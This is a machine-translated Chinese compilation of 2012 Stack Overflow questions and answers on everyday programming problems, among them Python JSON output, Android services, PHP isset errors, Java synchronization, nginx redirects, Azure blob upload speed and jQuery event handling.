[libstdc++ 手册](http://gcc.gnu.org/onlinedocs/libstdc++/manual/using_dynamic_or_shared.html#manual.intro.using.linkage.dynamic)列出了几个选项

# python - Python 元组 dict 到 JSON

> ID：11735119
> 
> 赞同：1
> 
> 时间：2012-07-31T07:22:48.080
> 
> 标签：python, json, dictionary

我的数据

```
(('check_kvserver_mem_4500000', 2737L), 
 ('check_ethstatus', 250L), 
 ('check_ddos', 229L), 
 ('check_coredump', 193L),
 ('check_robot', 174L),
 ('check_disk_90_95', 155L)) 
```

进入这个：`print json.dumps(data)`

```
[["check_kvserver_mem_4500000", 2737], 
 ["check_ethstatus", 250],
 ["check_ddos", 229],
 ["check_coredump", 193], 
 ["check_disk_90_95", 155]] 
```

我想要这样的数据

```
{["check_kvserver_mem_4500000", 2737],
 ["check_ethstatus", 250]
 ["check_ddos", 229], 
 ["check_coredump", 193], 
 ["check_disk_90_95", 155]} 
```

或者

```
 {"check_kvserver_mem_4500000":2737,
  "check_ethstatus":250,
  "check_ddos":229, 
  "check_coredump":193,
  "check_disk_90_95":155} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-31T07:27:39.620

结果是您想要一个 JSON 对象，但您的数据没有键/值结构。`json.dumps(data)`在生成 JSON 列表而不是对象时做正确的事情也是如此。元组的 Python 元组无法在无效的 JSON 对象上匹配。

**编辑**

在您更改了问题（并在执行此操作时删除了我*漂亮*的编辑）后，您的问题可以得到回答。

```
data = (('check_kvserver_mem_4500000', 2737L),
        ('check_ethstatus', 250L),
        ('check_ddos', 229L),
        ('check_coredump', 193L),
        ('check_robot', 174L),
        ('check_disk_90_95', 155L))
print json.dumps(dict(data)) 
```

结果是：

```
'{"check_disk_90_95": 155, "check_coredump": 193, "check_robot": 174,
  "check_kvserver_mem_4500000": 2737, "check_ddos": 229, "check_ethstatus": 250}' 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T07:32:21.450

```
 print json.dumps(dict(data))
 {"check_disk_90_95": 155,
  "check_coredump": 193,
  "check_robot": 174,
  "check_kvserver_mem_4500000": 2737,
  "check_ddos": 229,
  "check_ethstatus": 250} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-31T07:30:32.677

```
d = dict((('check_kvserver_mem_4500000', 2737L), ('check_ethstatus', 250L), ('check_ddos', 229L), ('check_coredump', 193L), ('check_robot',
174L), ('check_disk_90_95', 155L)))

import json 

print json.dumps(x, indent = 5) 
```

退货

```
{
     "check_disk_90_95": 155, 
     "check_coredump": 193, 
     "check_robot": 174, 
     "check_kvserver_mem_4500000": 2737, 
     "check_ddos": 229, 
     "check_ethstatus": 250
} 
```

# android - Galaxy Mini 2.2 上的 DatePicker 创建异常

> ID：11735120
> 
> 赞同：2
> 
> 时间：2012-07-31T07:22:50.730
> 
> 标签：android, android-2.2-froyo, android-datepicker

这个问题快把我逼疯了。它似乎只发生在我无法使用的手机 Galaxy Mini 上。

例外情况如下：

```
java.lang.ArrayIndexOutOfBoundsException
    at android.widget.NumberPicker.twSetMaxInputLength(NumberPicker.java:302)
    at android.widget.DatePicker.<init>(DatePicker.java:128)
    at android.widget.DatePicker.<init>(DatePicker.java:113)
    at java.lang.reflect.Constructor.constructNative(Native Method)
    at java.lang.reflect.Constructor.newInstance(Constructor.java:446)
    at android.view.LayoutInflater.createView(LayoutInflater.java:500) 
```

该错误发生在现有 Android 上不存在的 TouchWiz 特定方法上。

我该如何调试这个问题？我似乎无法找到 TouchWiz 的模拟器图像或资源，尽管人们希望资源会出现在某个地方。

有人有任何指示吗？

# linux - 为arm交叉编译Qt的OpenGL模块

> ID：11735122
> 
> 赞同：0
> 
> 时间：2012-07-31T07:22:59.623
> 
> 标签：linux, qt, opengl, cross-compiling, omap

我有一个[`dvsdk`](http://www.uweb.ucsb.edu/~karenportillo/files/OMAP3530_Software_Developers_Guide.pdf)用于交叉编译我的 Qt 项目的环境，以便它可以在 omap 板 [arm 处理器] 上运行。但问题是，我可以使用 Qt [QtCore、QtSql、QtGui、QtNetwork 等] 中可用的所有其他库，因为它的交叉编译版本已经在 dvsdk 中可用。但是该套件不支持`OpenGL`.

那么如何交叉编译`OpenGL`arm处理器的模块，以便`OpenGL`在交叉编译的同时静态链接库。或者任何其他解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:32:14.850

好吧，在 OMAP 上，您没有 OpenGL，而是 OpenGL-ES。而且您不会静态链接到 OpenGL（您永远不会这样做），而是使用任何可用的动态库。对于 TI OMAP，您需要来自 TI 开发人员下载区的 PoverVR SDK，其中包含 OMAP 中 PowerVR 内核的 OpenGL-ES 实现。遗憾的是，这是一个封闭源代码的二进制 blob 驱动程序，因此您可以动态链接到它。

# android - 即使活动关闭，如何使服务运行？

> ID：11735131
> 
> 赞同：0
> 
> 时间：2012-07-31T07:23:37.593
> 
> 标签：android

我有一个与套接字通信的应用程序。

我想将**套接字服务**绑定到通信活动。但如果**活动关闭**，**服务就毁了**。

无论活动是打开还是关闭，如何保持套接字服务运行？

如果我在活动停止时开始通知我的应用程序，服务是否正在运行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:29:02.210

您可以通过 android:process 标签在您的应用程序之外的另一个进程中启动服务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T07:25:07.533

您可以根据您的要求启动您的服务。

请通过[http://developer.android.com/guide/components/services.html](http://developer.android.com/guide/components/services.html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:26:33.147

您必须使用广播接收器、警报管理器和服务来实现此功能，

参考下面的帖子

[AlarmManager、BroadcastReceiver 和 Service 不工作](https://stackoverflow.com/questions/9053249/alarmmanager-broadcastreceiver-and-service-not-working)

# c# - 如何使文本框使用密码字符而不是在 wpf 中使用密码框？

> ID：11735133
> 
> 赞同：3
> 
> 时间：2012-07-31T07:23:40.110
> 
> 标签：c#, wpf, textbox

是否有任何更改使 TextBox 使用密码字符而不是在 wpf 中使用密码框？

```
<PasswordBox Height="42" Width="200"  Margin="22,28,28,0" 
     Name="passwordBox1" VerticalAlignment="Top" 
     Background="LightBlue" Foreground="DarkBlue" 
     MaxLength="25" PasswordChar="*" 
     /> 
```

使用上面的代码，我可以得到我需要的结果，但我必须使用文本框而不是密码框来实现相同的结果。我应该为此做些什么。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:26:39.527

TextBox 没有“密码模式”。PasswordBox 是唯一的出路。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-07-31T07:34:47.210

您可以通过更改文本框的属性将文本框更改为密码框。

首先，您创建一个文本框并按 F4。属性将打开。在那寻找'passwordchar'并将其更改为'*'。并更改您想要的任何内容，例如最大长度。

我想它会对你有所帮助..

# android - Facebook android 应用程序注销

> ID：11735137
> 
> 赞同：0
> 
> 时间：2012-07-31T07:23:44.520
> 
> 标签：android, facebook

我想向我的应用程序添加功能，让我退出 facebook android 应用程序。

有没有办法做到这一点，而不必在 facebook 上注册我的应用程序，因为我不需要任何其他 facebook 功能，除了注销。

有谁知道任何起点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T08:48:39.223

我不认为您的应用程序可以渗透到其他正在运行的应用程序的功能，除非 Facebook 应用程序本身为此提供了任何接口。

# c# - html文档解析问题

> ID：11735139
> 
> 赞同：2
> 
> 时间：2012-07-31T07:23:48.237
> 
> 标签：c#, html-agility-pack

我对 HtmlAgilityPack 有疑问。我从流中加载文档并保存它而不对文档进行任何操作。该文档包含`header`, `body`, `footer`。页眉和页脚的结构完全相同。然后返回`Filecontentresult`对象。代码 ：

```
HtmlDocument ndoc = new HtmlDocument();
ndoc.Load(stream);                        //load from stream                          

using (MemoryStream ms = new MemoryStream())
{
   ndoc.Save(ms);                         //save back in stream
   ms.Seek(0, System.IO.SeekOrigin.Begin);
   fileBytes = ms.ToArray();
}

FileContentResult file = File(fileBytes, "text/html");
return file; 
```

当我在浏览器中看到文档时，一切都在那里，但页脚消失了。然后我用`OptionOutputAsXml`这个页脚来了，但页脚的内容仍然消失了。

现在，如果我使用以下代码。只需删除 htmlagilitypack。直接从流中创建 FileContentResult。然后一切都很完美，并且有自己的位置。代码：

```
using (MemoryStream ms = new MemoryStream())
{
   stream.CopyTo(ms);            //copy stream contents in memorystream object
   fileBytes = ms.ToArray();
}

FileContentResult file = File(fileBytes, "text/html");
return file; 
```

谁能解释一下 HtmlAgilityPack 有什么问题？

# php - 三元运算符 - 我做错了什么？

> ID：11735143
> 
> 赞同：2
> 
> 时间：2012-07-31T07:24:15.333
> 
> 标签：php

```
$profilePic = isset( $userservice->getProfilePic($userid))      
              ?  filter($userservice->getProfilePic($userid)) 
              : '<img></img>'; 
```

返回错误：

```
Fatal error: Can't use method return value in write context 
```

我在这里做错了什么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T07:27:01.200

您只能`isset`与变量一起使用，而不能与函数的返回值一起使用，因为`isset`它不是函数，而是语言构造。

*附录*：有投票[允许将任意表达式参数传递给`isset`and`empty`](https://wiki.php.net/rfc/empty_isset_exprs)，但最终`isset`从最终实现中删除。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T07:27:12.573

`isset`仅且仅适用于变量。您不需要它来执行功能。你的三元运算符很好。

请参阅[PHP 的 isset 和 empty 权威指南](http://kunststube.net/isset/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:27:16.873

尝试： ”

```
$tempPic=$userservice->getProfilePic($userid);
         $profilePic = isset($tempPic ) ?  filter($userservicegetProfilePic($userid))  : '<img></img>'; 
```

"

# c++ - 将复杂的 C++ 对象写入文件

> ID：11735145
> 
> 赞同：1
> 
> 时间：2012-07-31T07:24:16.423
> 
> 标签：c++, file, serialization

我有一个看起来像这样的 C++ 对象

```
class myClass
{
    vector<OtherClass*> otherClassVector;
    AnotherClass* anotherClassObj;
    // A few other primitive types and functions
} 
```

将其存储到磁盘并以编程方式读回的最佳方法是什么？在二进制模式下使用 fstream 读/写会起作用吗？还是应该使用 boost 序列化？为什么？我不要求存储的文件是人类可读的。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-31T07:31:31.960

使用`boost::serialization`很简单，而不是编写自己的序列化程序。如果 OtherClass 是具体类型（不是基本类型） - 通过读/写序列化很简单，对于向量 - 只需保存大小而不是数组（如果您的 myClass 没有非 POD 类型），然后存储指向 anotheClassObj 指针的元素......

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-31T07:30:36.380

`ofstream f("filename", std::ios::binary);`只有当这些对象是 POD 类型时，您才能序列化对象。

其他任何事情都需要手动处理。举个简单的例子，如果对象包含任何指针，则将保存它们的地址，而不是它们指向的数据。

对于更复杂的类型，您将不得不完全手动序列化它们（编写一个类或函数来保存类中的所有 POD 数据并对所有“特殊”数据做一些棘手的事情），或者使用 boost 序列化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T04:19:15.597

[C++_Middleware Writer](http://webebenezer.net)可能很有趣。与其他方法相比，它具有[一些优势](http://webebenezer.net/comparison.html)。

# iphone - 将 Kal 日历集成到我的标签栏：

> ID：11735147
> 
> 赞同：5
> 
> 时间：2012-07-31T07:24:18.670
> 
> 标签：iphone, ipad, ios5

我正在开发一个 iPad 应用程序，并且在业务中相对较新。我正在尝试将 Kal 日历集成到选项卡项目中，该项目在登录应用程序后出现。但是没办法做到。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T15:26:27.343

如果您在选择标签栏项目后尝试显示全屏视图控制器。你会希望你的标签栏项目的视图控制器是 KalViewController 类型。如果您在带有情节提要的界面构建器中执行此操作，您将有一个标签栏控制器作为您的初始视图，然后将 UIViewController 拖到情节提要上。将该视图控制器的类更改为 KalViewController 并将其添加到选项卡栏视图控制器项。

如果您在代码中执行此操作，请实例化 KalViewController 并将其添加到 UITabBarController 的项目中：

```
KalViewController *kalVC = [[KalViewController alloc] init];
//set your tab bar's items, assuming you have a ref to the tab bar
tabBarController.tabBar setItems:@[kalVC,otherVC]; 
```

# php - 如何使用带有密钥的 Web 服务方法

> ID：11735154
> 
> 赞同：0
> 
> 时间：2012-07-31T07:24:52.117
> 
> 标签：php, web-services, soap

我正在尝试在 php 中安装和使用 web 服务。

我有网址：`http://cdt33.tourinsoft.com/soft/RechercheDynamique/Syndication/controle/syndication2.asmx`

我的代码：

```
$client = new SoapClient("http://cdt33.tourinsoft.com/soft/RechercheDynamique/Syndication/controle/syndication2.asmx?wsdl");

$arFunctions = $client->__getFunctions();

foreach ($arFunctions as $function) {
    echo $function.'<br/>';
} 
```

在这里，我可以检索此 Web 服务的所有方法。

但我想使用这种方法：DataSet getListing(string $idModule)，如果我`idModule = dafda774-317d-4b5f-bb8b-33e5977dc13c`在 url 上使用 (my key) 进行测试，它可以工作。

但我不能在 PHP 中做到这一点......有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-31T07:51:02.847

没关系...我找到了一种方法：

```
$rResultat = $client->getListing(
    array (
        'idModule' => "dafda774-317d-4b5f-bb8b-33e5977dc13c")); 
```

# java - Java并发混淆

> ID：11735158
> 
> 赞同：0
> 
> 时间：2012-07-31T07:25:28.873
> 
> 标签：java, multithreading, thread-safety

我上课了

```
class A{

private int id =0;
   public void setMessageId(Message m) {
      synchronized(m) {
        m.setId(id++);
      }
   }
} 
```

具有相同A类实例和不同消息实例的两个线程可以同时进入同步块并将相同的ID设置为不同的消息实例吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-31T07:27:02.147

是的。您需要在包含该`id`字段的对象（在本例中为“A”）或一些常见对象上进行同步。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-31T07:28:07.363

是的。由于块是在消息上同步的，因此使用两个不同消息实例的两个线程可以同时进入同步块，并且都得到相同的 ID。

使方法同步，一切都会好起来的。或者使用 AtomicInteger。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-31T07:29:02.287

如果只在 m 上同步，那么两个对象将能够修改 A 的同一个实例。您需要在存储值 id 的对象上进行同步。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-31T07:29:17.907

当然，因为您在不同的对象上同步。

如果您为此目的所需要的一切，最好使用 java.util.concurrent [AtomicInteger](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicInteger.html)来生成 ID 。

例如像这样：

```
private AtomicInteger counter;

public int getNextUniqueIndex() {
    return counter.getAndIncrement();
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-31T07:31:09.860

显然，因为锁是打开的 `Message m`，如果两个线程有​​不同的实例，`Message`那么它们可以..

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-07-31T07:31:11.257

**1.**由于**同步锁是在 message 的实例上**，那么**两个不同 message 对象的线程肯定可以同时访问这个块。**

**2.**即使**他们设置了相同的实例变量，它就像一个个人副本，每个对象一个。**

**3.**线程**改变一个对象的变量** **不会影响另一个对象的**`id`id 。

 *** * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-07-31T07:31:26.277

是的：

锁定对象是为 m 对象获得的，它们是每个线程的 2 个不同对象，所以是的，它们可以。在您的情况下，您将需要获得一个在这两个和 A 类之间共享的锁。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-07-31T07:32:23.330

是的，因为它们都有不同对象的锁。

完全没有自制同步的一种选择是使用[AtomicInteger](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicInteger.html)：

```
class A{
    private final AtomicInteger id = new AtomicInteger();

    public void setMessageId(Message m) {
       m.setId(id.incrementAndGet());    
    }
} 
```

方法[incrementAndGet](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/atomic/AtomicInteger.html#incrementAndGet%28%29)将值加一并返回更新后的值。**

# nginx - 更改服务器根目录时，Nginx 会导致重定向

> ID：11735161
> 
> 赞同：0
> 
> 时间：2012-07-31T07:25:40.683
> 
> 标签：nginx

我的 nginx 版本是：

```
root@v-enterprise15:/etc/nginx/conf.d# nginx -v
nginx: nginx version: nginx/1.0.5 
```

我的应用程序安装在

```
/usr/share/nginx/www/magento/current 
```

当我访问

```
http://{my_server}:81/magento/current/index.php 
```

它工作正常。这是因为服务器根设置为`/usr/share/nginx/www`;

现在我想使用`http://{myserver}:81/index.php`. 当我将服务器根目录更改为`/usr/share/nginx/www/magento/current`并键入上述 URL 时，它会使用 http 302 重定向到

```
http://{my_server}:81/magento/current 
```

这可能是什么原因？

然后它会应用我的 .conf 中的其他规则并给出 404。

我在访问日志中看到了这一点：

```
[31/Jul/2012:11:19:23 +0530] "GET /index.php HTTP/1.1" 302 5 "-" "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.10.229 Version/11.64" 
```

我的 .conf 文件是：

```
server {
    listen 81 default;
## SSL directives might go here
    server_name {my_server};
    #root /usr/share/nginx/www;
    root /usr/share/nginx/www/magento/current;
    error_log /var/log/nginx.error.log notice;
    access_log /var/log/nginx.access.log ;

    rewrite_log on;

    location / {
        auth_basic           "Restricted"; ## Message shown in login window
        auth_basic_user_file htpasswd; ## See /etc/nginx/htpassword
        index index.html index.php; ## Allow a static html file to be shown first
        try_files $uri $uri/ @magehandler; ## If missing pass the URI to Magento's front handler
        #try_files $uri $uri/ ; ## If missing pass the URI to Magento's front handler
        #expires 30d; ## Assume all files are cachable
    }

    location ^~  /. { ## Disable .htaccess and other hidden files
        return 404;
    }

    location @magehandler { ## Magento uses a common front handler
        #rewrite / /index.php;
        rewrite ^(.*) index.php$1 last;
    }

    #The more-specific regex are at the top.
    #The regex's are evaluated in the order in which they appear.
    location ~ .php$ { ## Execute PHP scripts
        #if (!-e $request_filename) { rewrite / /index.php last; } ## Catch 404s that try_files miss
            proxy_read_timeout 120;
            proxy_connect_timeout 120;
        expires        off; ## Do not cache dynamic content
        fastcgi_pass   127.0.0.1:9000;
        #fastcgi_param  HTTPS $fastcgi_https;
        fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
        fastcgi_param  MAGE_RUN_CODE default; ## Store code is defined in administration > Configuration > Manage Stores
        fastcgi_param  MAGE_RUN_TYPE store;
        include        fastcgi_params; ## See /etc/nginx/fastcgi_params
    }
    location ~ /(media|skin|js)/ { }
    location ~ /(tag|admin|customer|wishlist|checkout|catalog|app).*$ { #store URL
            rewrite /(.*)$ /index.php/$1 last;
    }

    location ~ /[a-zA-Z]+$ { #store URL
            rewrite ^/([a-zA-Z]+) ?store=$1 last;
    }
    location ~ /[a-zA-Z]+/ { #store URL
            rewrite ^/([a-zA-Z]+)(.*) /$2?store=$1 last;
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T09:25:38.710

由于您的 nginx 配置中没有任何重定向，因此重定向很可能是由您的应用程序引起的。

# android - 显示/隐藏 Phonegap Android 的软键盘插件

> ID：11735162
> 
> 赞同：1
> 
> 时间：2012-07-31T07:25:44.550
> 
> 标签：android, cordova, android-softkeyboard

我正在使用 Phonegap 开发一个 Android 应用程序，并使用了[此处找到的 SoftKeyboard 插件，并在](https://github.com/nikhilben/phonegap-plugins/tree/master/Android/SoftKeyboard)[How to use Phonegap SoftKeyboard Plugin for Android?](https://stackoverflow.com/questions/9060658/how-to-use-phonegap-softkeyboard-plugin-for-android)的指导下使用此插件？这个链接。它工作正常。

我使用此代码`((((window || {}).plugins || {}).SoftKeyBoard || {}).show || function(){})();`来防止未定义的问题..

我的问题是我需要知道键盘隐藏和显示事件如何找出这个？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-08-05T09:24:34.013

使用这个插件

> [https://github.com/phonostar/PhoneGap-SoftKeyboard](https://github.com/phonostar/PhoneGap-SoftKeyboard)

使用此命令安装插件。

> 科尔多瓦插件添加[https://github.com/phonostar/PhoneGap-SoftKeyboard.git](https://github.com/phonostar/PhoneGap-SoftKeyboard.git)

它会自动将所有必要的文件放置到适当的位置并更改配置。使用喜欢

> 软键盘.show();
> 
> 软键盘.hide();

# iphone - iPhone中的Dropbox下载问题

> ID：11735167
> 
> 赞同：3
> 
> 时间：2012-07-31T07:26:00.247
> 
> 标签：iphone, objective-c, ios, xcode

您好，我在我的应用程序中使用 Dropbox API。我想从我的 Dropbox 帐户下载图像并将它们存储在模拟器或设备目录中。我已经使用 Full DropBox Access 在 Dropbox 中创建了应用程序。但它给了我这个错误：

> [警告] DropboxSDK：向 /1/files/sandbox/Photos 发出请求时出错 - 应用程序文件夹（沙盒）访问尝试失败，因为此应用程序未配置为具有应用程序文件夹。您的访问类型应该改为“保管箱”吗？

这是我的代码

```
restClient = [[DBRestClient alloc] initWithSession:[DBSession sharedSession]];
restClient.delegate = self;
NSString *fileName = [NSString stringWithFormat:@"/avatar.jpg"];

NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, 
                                                     NSUserDomainMask, YES);
NSString *documentsDirectory = [paths objectAtIndex:0];

NSString* path2 = [documentsDirectory stringByAppendingString:
                            [NSString stringWithFormat:@"%@", fileName]];

[restClient loadFile:fileName intoPath:path2]; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-07-31T13:40:51.100

设置 Dropbox 会话时，您必须设置正确的根：

```
DBSession* dbSession =
    [[DBSession alloc]
      initWithAppKey:@"APP_KEY"
      appSecret:@"APP_SECRET"
      root:kDBRootDropbox]; // either kDBRootAppFolder or kDBRootDropbox
    [DBSession setSharedSession:dbSession]; 
```

在您的情况下，因为您使用的是完整的 Dropbox，您需要将 root 设置为 KDBRootDropbox。

# c# - Azure Blob 存储 - 上传速度很慢

> ID：11735177
> 
> 赞同：1
> 
> 时间：2012-07-31T07:27:08.610
> 
> 标签：c#, .net, azure, azure-blob-storage

我在 azure blob 存储中有试用帐户。我尝试从本地机器上传 100000 个生成的文件。该操作的持续时间已经超过 17 小时，并且仅上传了约 77000 个文件。由一个简单的 bash 脚本创建的所有文件：

```
for i in {1..100000}
do
    echo $i
    echo $i > $1\\$i.txt
done 
```

上传代码：

```
using(var stream = File.OpenWrite(textBoxManyUploadFileName.Text))
using(var writer = new StreamWriter(stream)) {
    foreach(var file in Directory.GetFiles(textBoxManyUploadFrom.Text)) {
        Guid id = Guid.NewGuid();
        storage.StoreFile(file, id, ((FileType)comboBoxManyUploadTypes.SelectedItem).Number);
        writer.WriteLine("{0}={1}", id, file);
    }
}

public void StoreFile(Stream stream, Guid id, string container) {
    try {
        var blob = GetBlob(id, container);
        blob.UploadFromStream(stream);
    } catch(StorageException exception) {
        throw TranslateException(exception, id, container);
    }
}

public void StoreFile(string filename, Guid id, int type = 0) {
    using(var stream = File.OpenRead(filename)) {
        StoreFile(stream, id, type);
    }
}

CloudBlob GetBlob(Guid id, string containerName) {
    var container = azureBlobClient.GetContainerReference(containerName);
    if(container.CreateIfNotExist()) {
        container.SetPermissions(new BlobContainerPermissions {
            PublicAccess = BlobContainerPublicAccessType.Container
        });
    }
    return container.GetBlobReference(id.ToString());
} 
```

前 10000 个文件在 20-30 分钟内上传了 bean，然后速度下降。我认为这可能是因为文件名是 GUID 并且 Azure 尝试构建聚集索引。如何加快速度？问题是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-31T07:34:58.930

要上传许多小文件，您应该使用多个线程。例如，您可以使用[BeginUploadFromStream](http://msdn.microsoft.com/en-us/library/windowsazure/microsoft.windowsazure.storageclient.cloudblob.beginuploadfromstream)或[Parallel.ForEach](http://msdn.microsoft.com/en-us/library/dd460720.aspx)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T07:46:15.087

我在您的代码中注意到的另一件事是您在 StoreFile() 函数中调用 GetBlob() 函数，该函数又在 Blob 容器上调用 CreateIfNotExist() 函数。请注意，此函数还会导致调用存储服务，从而在您的上传过程中增加延迟（更不用说您每次调用此函数时还要为存储交易付费）。

我建议您在开始上传 Blob 之前只调用一次此函数。

# php - 从数据库 PHP 获取特定的文本区域并在其中写入数据？

> ID：11735187
> 
> 赞同：0
> 
> 时间：2012-07-31T07:27:50.873
> 
> 标签：php, mysql

我有一些问题，我正在阅读表单数据库并使用 while 循环将它们全部显示出来，但现在我在另一个表中的数据库中也有这些问题的答案。因此，我需要将这些答案放入每个问题下方的 textarea 中，对于没有答案的问题只是留下空的 textarea。我怎么能知道在哪里放置特定答案，我的意思是如何解决问题 - 答案？谢谢。

这是循环：

```
$j = 1;
    while($rowQuestion = $connector->fetchArray($resultUser)) {

        echo "
            <div class='question'>
                <h4>".$rowQuestion['wq_title']."</h4>
                <p>".$rowQuestion['wq_desc']."</p>
        ";
            $queryAnswer = "SELECT *
            FROM workshop_answers
            WHERE id_user='".$_GET['userid']."' AND q_comp='1' AND id_que='".$j."'";
            $resultAnswer = $connector->query($queryAnswer);
            $rowAnswer = $connector->fetchArray($resultAnswer);

        echo "
            <textarea readonly='readonly' id='".$j."'>".$rowAnswer['q_answer']."</textarea>

            <div class='ftr'>
                <a href='#top' class='pull-right'>Back to Top</a>
            </div>
            </div>
        ";
        $j++;
    } 
```

嘿伙计们，我做了一些修改，现在效果很好。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:31:52.777

在您的 sql 查询中使用`left outer join`以连接问题表和答案表。

# javascript - jquery children 附加删除编辑输入

> ID：11735188
> 
> 赞同：0
> 
> 时间：2012-07-31T07:27:53.613
> 
> 标签：javascript, jquery

在生日那天得到比你期望的更多的东西可能会很好 - 但脚本中的这个让你发疯...... :(

我有以下代码：

```
 <html xmlns="http://www.w3.org/1999/xhtml">
    <head runat="server">
    <title></title>
    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
    <script type="text/javascript" src="../scripts/jquery-ui.min.js"></script>
    </head>
    <body>
    <form id="form1" runat="server">
    <div>
    <div id="id1" class="fragenMainDiv" style="width: 80%; margin: 0px;">
    <input type="button" id="id1_edit" class="editIcon" value="change">
    <span id="id1_Label" class="fragenLabel">
    <p>
    <span style="margin-left:5px;">
    <b>something</b>
    </span>
    </p>
    </span>
    </div>
    </div>
    </form>
    </body>

    <script type="text/javascript">

    $(document).ready(function () {
    showMain();
    });
    function showMain() {

    $('.editIcon').css("cursor", "pointer").click(function () {
    edit($(this).attr("id"));
    });

    $('.editfinish').css("cursor", "pointer").click(function () {
    editFinish($(this).attr("id"));
    });
    }

    function edit(idTemp) {
    //alert(fragenidTemp);
    var IdArray = idTemp.split("_");
    var Id = IdArray[0]
    var inputValue = $('div[id|="' + Id + '"]').children("span").children("p").children("span").children("b").text();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span").children("b").remove();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").append("<input id=input" + Id + " type=text size=70 style=margin-left:4px;></input><input type=button id=" + Id + " class=editfinish value=change />");

    $('input[id|="input' + Id + '"]').val(inputValue);
    $('.editIcon').hide();
    showMain();
    }

    function editFinish(Id) {
    var inhaltFrage = $('input[id|="input' + Id + '"]').val();
    $('.editIcon').show();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").children("input").remove();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").children("img").remove();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").append("<b>" + inhaltFrage + "</b>");

    showMain();
    }

    </script>

    </html> 
```

我想要的是一个像普通输入字段一样反应的输入字段 - 但是在第一次（正确）值更改之后，表单显示输入字段的三倍......

有人有想法吗？因为它是一个更大脚本的精简脚本，所以我需要函数的结构。谢谢你的帮助 ：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-31T07:36:29.387

Argghhh 我终于找到了。伙计，您不能在每次编辑和 editFinish 后使用 show main 。因为您一键堆叠了几个相同的事件！代码应如下所示：

```
function edit(idTemp) {
    //alert(fragenidTemp);
    var IdArray = idTemp.split("_");
    var Id = IdArray[0]
    var inputValue = $('div[id|="' + Id + '"]').children("span").children("p").children("span").children("b").text();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span").children("b").remove();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").append("<input id=input" + Id + " type=text size=70 style=margin-left:4px;></input><input type=button id=" + Id + " class=editfinish value=change />");

    $('input[id|="input' + Id + '"]').val(inputValue);
    $('.editIcon').hide();
     $('.editfinish').css("cursor", "pointer").click(function () {
    editFinish($(this).attr("id"));
    });
    }

    function editFinish(Id) {
    var inhaltFrage = $('input[id|="input' + Id + '"]').val();
    $('.editIcon').show();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").children("input").remove();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").children("img").remove();
    $('div[id|="' + Id + '"]').children("span").children("p").children("span:first").append("<b>" + inhaltFrage + "</b>");    } 
```

希望您现在看到错误，如果没有，我可以详细解释。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-31T10:09:57.100

HTML

```
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
<title>Test</title>
</head>
<body>
<form id="form1" runat="server">
<div>
<input type="button" id="btn_change" value="Change" />
<span id="id1_Label" class="fragenLabel">
</span>
<span id="id1_Input">
<input type="text" id="content1_edit" value="default-value" />
</span>
</div>
</form>
</body>
</html> 
```

JAVASCRIPT

```
$(document).ready(function(){
    // Mostly this should be coming from database on page-load;
    updateVal();

    $("#btn_change").click(function(){
         if( $(this).val() == "Change" )
         {
             editVal();
         }
        else
        {
            updateVal();
        }
    })
});

function editVal()
{
    $("#id1_Label").hide();
    $("#id1_Input").show();
    $("#btn_change").val("Update");
}

function updateVal()
{
    $("#id1_Label").html( $("#content1_edit").val()).show();
    $("#id1_Input").hide();
    $("#btn_change").val("Change");
} 
```

